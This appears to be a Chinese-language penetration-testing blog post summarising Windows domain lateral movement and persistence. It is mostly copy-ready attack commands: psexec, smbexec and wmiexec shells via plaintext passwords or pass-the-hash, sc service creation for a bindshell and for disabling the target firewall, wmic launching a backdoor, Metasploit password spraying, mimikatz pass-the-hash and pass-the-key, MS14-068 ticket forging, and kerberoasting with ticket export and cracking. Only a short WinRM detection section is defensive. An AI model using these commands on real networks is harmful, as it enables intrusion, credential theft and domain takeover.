<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs elixir">建立ipc连接：net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">213.163</span>\ipc<span class="hljs-variable">$ </span><span class="hljs-string">&quot;123.com&quot;</span> /<span class="hljs-symbol">user:</span>administrator<br>使用psexec返回cmd窗口：psexec \\<span class="hljs-number">192.168</span>.<span class="hljs-number">213.163</span> -s cmd<br><br>第二种：不用建立 <span class="hljs-title class_">IPC</span> 直接提供明文账户密码<br>删除ipc连接：net <span class="hljs-keyword">use</span> * /delete<br><br>直接明文连接：psexec \\<span class="hljs-number">192.168</span>.<span class="hljs-number">213.163</span> -u administrator -p <span class="hljs-number">123</span>.com -s cmd<br>hash连接：<br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>./administrator<span class="hljs-variable">@10</span>.<span class="hljs-number">1.2</span>.<span class="hljs-number">3</span><br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>domain/administrator<span class="hljs-variable">@10</span>.<span class="hljs-number">1.2</span>.<span class="hljs-number">3</span><br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c ./administrator<span class="hljs-variable">@10</span>.<span class="hljs-number">20.5</span>.<span class="hljs-number">107</span> 官方 <span class="hljs-title class_">Pstools</span> 无法<br>采。需要使用 impacket 工具包使用，操作简单，容易被杀<br></code></pre></td></tr></table></figure>

<p>** psexec（微软官方工具）另外**</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 明文传递</span><br> PsExec64<span class="hljs-selector-class">.exe</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">52.136</span> -u &lt;username&gt; -<span class="hljs-selector-tag">p</span> &lt;password&gt; -s cmd <br><br><span class="hljs-comment">// 哈希传递 </span><br>psexec<span class="hljs-selector-class">.exe</span> admin@<span class="hljs-number">10.73</span>.<span class="hljs-number">147.30</span> -hashes <span class="hljs-number">624</span>aac413795cdc1a5c7b1e00f780017:<span class="hljs-number">852</span>a844adfce18f66009b4f14e0a98de<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/1.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p><strong>2）smbexec传递</strong></p>
<p> 无需先建立 ipc 链接 明文或 hash 传递</p>
<p> 这是使用impacket工具包，</p>
<p> exe下载地址：<a target="_blank" rel="noopener" href="https://gitee.com/RichChigga/impacket-examples-windows/repository/archive/master.zip">https://gitee.com/RichChigga/impacket-examples-windows/repository/archive/master.zip</a></p>
<p> py版本：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">明文传递命令：<br>smbexec hsyy.com/<span class="hljs-symbol">administrator:</span><span class="hljs-number">123</span>.com<span class="hljs-variable">@192</span>.<span class="hljs-number">168.213</span>.<span class="hljs-number">163</span> <br><br>hash传递： <br>smbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>./admin<span class="hljs-variable">@192</span>.<span class="hljs-number">168.213</span>.<span class="hljs-number">163</span> <br>smbbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>domain/admin<span class="hljs-variable">@192</span>.<span class="hljs-number">168.213</span>.<span class="hljs-number">163</span><br></code></pre></td></tr></table></figure>

<p>另外</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> psexec.py -hashes :<span class="hljs-number">36</span>ec9d73422e1bf53b84fdb16a8e4198 ./qaxnb@<span class="hljs-number">192.168.52.136</span><br></code></pre></td></tr></table></figure>

<p><strong>smbexec</strong></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">python</span> smbexec.py ./:@192<span class="hljs-number">.168</span><span class="hljs-number">.52</span><span class="hljs-number">.136</span><br></code></pre></td></tr></table></figure>

<h4 id="sc–创建Windows服务来进行横向渗透（依赖IPC）"><a href="#sc–创建Windows服务来进行横向渗透（依赖IPC）" class="headerlink" title="sc–创建Windows服务来进行横向渗透（依赖IPC）"></a>sc–创建Windows服务来进行横向渗透（依赖IPC）</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">使用条件：<br> 当前跳板机用户具有管理员权限(因为要创建服务)。 <br> 与目标机器已经建立ipc连接 <br><br><br>首先建立ipc连接：<br>利用<span class="hljs-keyword">sc横向（开了防火墙创建不成功）</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">sc </span>\\<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">5</span>.<span class="hljs-number">107</span> create <span class="hljs-keyword">bindshell </span><span class="hljs-keyword">binpath=&quot;c:\shell.exe&quot;</span><br><span class="hljs-keyword"></span>注意这里的格式，“=”后面是必须空一格的，否则会出现错误。<br>立即启动该服务:<br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">5</span>.<span class="hljs-number">107</span> start <span class="hljs-keyword">bindshell</span><br><span class="hljs-keyword"></span>使用完后删除刚才创建的服务<br><span class="hljs-keyword">sc </span>\\[host] delete [servicename] <span class="hljs-comment">#删除服务== sc \\10.20.5.107 delete bindshell</span><br>我们还可以通过设置服务来关闭防火墙(没开防火墙失败)：<br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">5</span>.<span class="hljs-number">107</span> create unablefirewall <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">5</span>.<span class="hljs-number">107</span> start unablefirewall<br><br></code></pre></td></tr></table></figure>

<h3 id="2、wmic横向"><a href="#2、wmic横向" class="headerlink" title="2、wmic横向"></a>2、wmic横向</h3><h5 id="查询远程进程信息"><a href="#查询远程进程信息" class="headerlink" title="查询远程进程信息"></a><strong>查询远程进程信息</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:10.20.5.107 /user:Administrator /password:qwer1234 process list brief<br></code></pre></td></tr></table></figure>

<h5 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a><strong>远程桌面</strong></h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">10.20</span><span class="hljs-number">.5</span><span class="hljs-number">.107</span> /<span class="hljs-keyword">USER</span>:Administrator <span class="hljs-type">PATH</span> win32_terminalservicesetting <span class="hljs-keyword">WHERE</span> (__Class!=&quot;&quot;) <span class="hljs-keyword">CALL</span> SetAllowTSConnections <span class="hljs-number">1</span>// wmic /node:&quot;[full machine name]&quot; /<span class="hljs-keyword">USER</span>:&quot;[domain]\[username]&quot; <span class="hljs-type">PATH</span> win32_terminalservicesetting <span class="hljs-keyword">WHERE</span> (__Class!=&quot;&quot;) <span class="hljs-keyword">CALL</span> SetAllowTSConnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h5 id="查询远程进程信息-1"><a href="#查询远程进程信息-1" class="headerlink" title="查询远程进程信息"></a><strong>查询远程进程信息</strong></h5><h5 id="远程创建进程"><a href="#远程创建进程" class="headerlink" title="远程创建进程"></a><strong>远程创建进程</strong></h5><p>如下，以administrator用户连接192.168.183.130(DC)，并在机器上创建一个进程执行ipconfig命令，将结果写入C:\result.txt文本文件中：（由于wmic执行远程命令没有回显，所以要将结果写入到txt中） </p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">10.20</span><span class="hljs-number">.5</span><span class="hljs-number">.107</span> /<span class="hljs-keyword">user</span>:Administrator /<span class="hljs-keyword">password</span>:qwer1234 process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;<br><span class="hljs-keyword">type</span> \\<span class="hljs-number">10.20</span><span class="hljs-number">.5</span><span class="hljs-number">.107</span>\c$\result.txt<br>wmic /node:<span class="hljs-number">10.20</span><span class="hljs-number">.5</span><span class="hljs-number">.107</span> /<span class="hljs-keyword">user</span>:Administrator /<span class="hljs-keyword">password</span>:qwer1234 process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c &lt;命令&gt; &gt; C:\result.txt&quot;<br><br>// 执行脚本<br>wmic /node:<span class="hljs-number">10.20</span><span class="hljs-number">.5</span><span class="hljs-number">.107</span> /<span class="hljs-keyword">user</span>:Administrator /<span class="hljs-keyword">password</span>:qwer1234 process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;目录\backdoor.exe&quot;<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/2.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h4 id="python工具–wmiexec"><a href="#python工具–wmiexec" class="headerlink" title="python工具–wmiexec"></a>python工具–wmiexec</h4><h5 id="WMIEXEC"><a href="#WMIEXEC" class="headerlink" title="WMIEXEC"></a><strong>WMIEXEC</strong></h5><p>wmiexec是对windows自带的wmic做了一些强化，让渗透变得更容易。比较好用的在这里介绍几种。wmiexec需要提供账号密码进行远程连接，但是如果没有破解出账号和明文密码，也可以配合哈希传递或票据注入功能一起使用，先进行传递或注入，然后再使用WMIEXEC即可。</p>
<h3 id="Impacket中的wmiexec-py"><a href="#Impacket中的wmiexec-py" class="headerlink" title="Impacket中的wmiexec.py"></a><strong>Impacket中的wmiexec.py</strong></h3><p>该脚本是impacket工具包中的一个工具，主要在从Linux像Windows进行横向渗透时使用，十分强大，可以走socks代理进入内网。</p>
<p>下载地址：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py">https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</a></p>
<p>使用很简单，运行如下命令获取目标系统DC(192.168.183.130)的Shell：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> wmiexec.<span class="hljs-keyword">py</span> administrator:Liu78963@<span class="hljs-number">192.168</span>.<span class="hljs-number">183.130</span>// <span class="hljs-keyword">python</span> wmiexec.<span class="hljs-keyword">py</span> 用户名:密码@目标IP<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/3.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h3 id="3、密码喷洒"><a href="#3、密码喷洒" class="headerlink" title="3、密码喷洒"></a>3、密码喷洒</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">4.1 利用 metasploit 进行密码喷洒<br>msf6 exploit(windows/smb/psexec) &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/bind_tcp<br>msf6 exploit(windows/smb/psexec) &gt; <span class="hljs-built_in">set</span> smbuser user.txt<br>msf6 exploit(windows/smb/psexec) &gt; <span class="hljs-built_in">set</span> smbpass password.txt<br>msf6 exploit(windows/smb/psexec) &gt; <span class="hljs-built_in">set</span> rhost 192.168.52.0/24<br>msf6 exploit(windows/smb/psexec) &gt; run<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/4.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h3 id="4、PTH-哈希传递"><a href="#4、PTH-哈希传递" class="headerlink" title="4、PTH - 哈希传递"></a>4、PTH - 哈希传递</h3><p>​	PTH，即 Pass The Hash，通过找到与账号相关的密码散列值 (通常是 NTLM Hash) 来进行攻击。在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码。因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就可以使用哈希传递的方法登录到内网主机的其他计算机。</p>
<p>1、利用条件</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>、在工作组环境中：<br>Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。<br>Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问<br><br><span class="hljs-number">2</span>、在域环境中：<br>只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器<br>如果要用普通域管理员账号进行哈希传递攻击，则需要修改修改目标机器的 LocalAccountTokenFilterPolicy为<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>2、MiMiKatz-PTH</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.mimikatz</span> privilege::debug<br><span class="hljs-number">2</span><span class="hljs-selector-class">.mimikatz</span> sekurlsa::pth /user:administrator /domain:goksec<span class="hljs-selector-class">.org</span> /ntlm:<span class="hljs-number">8</span>a963371a63944419ec1adf687bb1be5<br><span class="hljs-number">3</span><span class="hljs-selector-class">.steal_token</span> PID<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/5.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>ntml&#x3D;&#x3D;run 哈希</p>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/6.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/7.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h3 id="5、PTK-横向"><a href="#5、PTK-横向" class="headerlink" title="5、PTK-横向"></a>5、PTK-横向</h3><p>​	即 Pass The Key ，当系统安装了 KB2871997 补丁且禁用了 NTLM 的时候，那我们抓取到的 ntlm hash. 也就失去了作用，但是可以通过 pass the key 的攻击方式获得权限。</p>
<p>利用条件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">获取用户的aes key<br>mimikatz sekurlsa::ekeys<br>sekurlsa::pth /user:xxx /domain:xxx /aes256:xxxxxxxx<span class="hljs-string">&quot;</span><br><span class="hljs-string">成功后会返回一个cmd</span><br></code></pre></td></tr></table></figure>

<h3 id="6、PtT-票据传递（ms14-068）"><a href="#6、PtT-票据传递（ms14-068）" class="headerlink" title="6、PtT - 票据传递（ms14-068）"></a>6、PtT - 票据传递（ms14-068）</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.域控没有打MS14-<span class="hljs-number">068</span>的补丁(KB3011780)<br><span class="hljs-attribute">2</span>.拿下一台加入域的计算机<br><span class="hljs-attribute">3</span>.有这台域内计算机的域用户密码和Sid<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/8.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a><strong>利用步骤</strong></h4><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lasso">先清空当前机器的票据信息<br>mimikatz kerberos<span class="hljs-type">::list</span> <span class="hljs-comment">//列出当前票据</span><br>mimikatz kerberos<span class="hljs-type">::purge</span> <span class="hljs-comment">//清除票据</span><br>然后查看本机的sid<br>whoami /<span class="hljs-literal">all</span><br></code></pre></td></tr></table></figure>

<h4 id="ms14-068生成tgt票据："><a href="#ms14-068生成tgt票据：" class="headerlink" title="ms14-068生成tgt票据："></a><strong>ms14-068生成tgt票据：</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ms14</span>-<span class="hljs-number">068</span>.exe -u lisi@goksec.org -p goksec@<span class="hljs-number">2021</span> -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1797401017</span>-<span class="hljs-number">738776913</span>-<span class="hljs-number">2751391128</span>-<span class="hljs-number">1106</span> -d DC.goksec.org<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/9.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">导入票据<br>mimikatz kerberos::ptc &lt;&gt;&gt;<br><br>使用如下命令，可成功读取域控主机C盘目录下文件<br><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \DC.goksec.org\c$</span><br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/10.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/11.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h3 id="7、kerberoast-攻击"><a href="#7、kerberoast-攻击" class="headerlink" title="7、kerberoast 攻击"></a>7、kerberoast 攻击</h3><p>​	攻击者从 TGS-REP 中提取加密的服务票证。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。</p>
<h3 id="如何得到域中的-SPN？"><a href="#如何得到域中的-SPN？" class="headerlink" title="如何得到域中的 SPN？"></a><strong>如何得到域中的 SPN？</strong></h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">setspn -<span class="hljs-selector-tag">q</span> /<br><br>cscript GetUserSPNs<span class="hljs-selector-class">.vbs</span><br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/12.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h3 id="请求服务票据"><a href="#请求服务票据" class="headerlink" title="请求服务票据"></a><strong>请求服务票据</strong></h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz kerberos::ask /target:<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/13.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h3 id="导出票据"><a href="#导出票据" class="headerlink" title="导出票据"></a><strong>导出票据</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">mimikatz kerberos::list /<span class="hljs-keyword">export</span><br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/14.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h3 id="破解服务票据："><a href="#破解服务票据：" class="headerlink" title="破解服务票据："></a><strong>破解服务票据：</strong></h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 tgsrepcrack<span class="hljs-selector-class">.py</span> password<span class="hljs-selector-class">.txt</span> xxxx.kirbi<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/15.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h3 id="8、WinRM-横向"><a href="#8、WinRM-横向" class="headerlink" title="8、WinRM 横向"></a>8、WinRM 横向</h3><p>​	WinRM 代表 Windows 远程管理，是一种允许管理员远程执行系统管理任务的服务。默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证。</p>
<h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>、在win <span class="hljs-number">2012</span>之后(包括win <span class="hljs-number">2012</span>)的版本是默认开启的，win <span class="hljs-number">2012</span>之前利用需要手动开启winRM。<br><span class="hljs-attribute">2</span>、防火墙对<span class="hljs-number">5986</span>、<span class="hljs-number">5985</span>端口开放。<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/16.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>空连接失败：</p>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/17.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h5 id="无法访问的情况"><a href="#无法访问的情况" class="headerlink" title="无法访问的情况"></a><strong>无法访问的情况</strong></h5><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">情况<span class="hljs-number">1</span>：WinRM服务将在Windows <span class="hljs-built_in">Server</span> <span class="hljs-number">2008</span>和更高版本上自动启动（在Windows Vista中，需要手动启动该服务）。默认情况下，未配置WinRM侦听器。即使WinRM服务正在运行，也无法接收或发送请求数据的WS-Management协议消息。<br><br>情况<span class="hljs-number">2</span>：Internet连接防火墙（ICF）阻止访问端口。<br></code></pre></td></tr></table></figure>

<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a><strong>防御</strong></h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">当然，存在检测和限制WinRM远程命令执行/横向移动的机会。考虑以下：<br>监视源自wmiprvse.<span class="hljs-keyword">exe</span>和winrshost.<span class="hljs-keyword">exe</span>的远程进程执行链<br>监视Microsoft-Windows-WinRM / Operational事件日志中的可疑条目。注意：在测试WMI类交互（WinRM.vbs / SharpWSManWinRM / etc）期间，似乎没有成功的连接会话记录在此处。但是，未成功的错误记录了WMI资源的名称。<br>考虑将可信主机列入白名单，以仅允许某些计算机连接到WinRM服务器。可以在此Red Canary博客文章中找到更多信息。注意：WinRM受信任的主机控制客户端可以连接到什么。这样，以集中方式控制此设置可能是有利的，但是更好的方法是利用跳转主机和（主机）防火墙规则来控制应允许哪些计算机连接到WinRM主机。<br>管理员不是唯一可以利用WinRM进行远程管理的用户。该成员远程管理用户本地/域组可以在WinRM的连接到WMI资源。确保仅允许授权人员使用组成员身份。<br></code></pre></td></tr></table></figure>

<h2 id="四、维持权限"><a href="#四、维持权限" class="headerlink" title="四、维持权限"></a>四、维持权限</h2><p>上篇中有介绍Windows的权限维持，本篇主要补充一下windows权限维持中的票据，以及Linux中的权限维持。</p>
<h3 id="Windows权限维持之黄金白银票据"><a href="#Windows权限维持之黄金白银票据" class="headerlink" title="Windows权限维持之黄金白银票据"></a>Windows权限维持之黄金白银票据</h3><p>少写理论（因为网上都能查到理论）多写实践：</p>
<p>​	用一句话来说，就是金票比银票权限高，金票是去拿域控制器权限的，银票是去拿域内某个服务的权限的。都是拿SID和NTLM去做维权。</p>
<h4 id="黄金票据（Golden-ticket）"><a href="#黄金票据（Golden-ticket）" class="headerlink" title="黄金票据（Golden ticket）"></a><strong>黄金票据（Golden ticket）</strong></h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">在Kerberos认证中,Client通过<span class="hljs-keyword">AS</span>(身份认证服务)认证后,<span class="hljs-keyword">AS</span>会给Client一个Logon <span class="hljs-keyword">Session</span> Key和TGT,而Logon <span class="hljs-keyword">Session</span> Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon <span class="hljs-keyword">Session</span> Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过<span class="hljs-keyword">AS</span>验证,不用验证账户和密码,所以也不担心域管密码修改。<br><br>参考：https://www.jianshu.com/p/<span class="hljs-number">4936</span>da524040<br></code></pre></td></tr></table></figure>

<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">黄金票据常用于权限维持。 当我们获得域控的控制权限后，有可能获取域内所有用户的<span class="hljs-built_in">hash</span>，和krbtgt的<span class="hljs-built_in">hash</span>。这时，由于一些原因导致我们失去对目标的控制权，但是我们还留有一个普通用户的权限，并且krbtgt的密码没有更改，此时我们可以利用krbtgt用户的ntlm <span class="hljs-built_in">hash</span>制作黄金票据伪造tgt，重新获取域控的管理权限。<br></code></pre></td></tr></table></figure>

<h5 id="所需条件"><a href="#所需条件" class="headerlink" title="所需条件"></a><strong>所需条件</strong></h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1</span>、域名称<br><span class="hljs-number">2</span>、域的SID值<br><span class="hljs-number">3</span>、域的KRBTGT账号的<span class="hljs-built_in">HASH</span><br><span class="hljs-number">4</span>、伪造任意用户名<br>（获取域的SID和KRBTGT账号的NTLM <span class="hljs-built_in">HASH</span>的前提是需要已经拿到了域的权限）<br></code></pre></td></tr></table></figure>

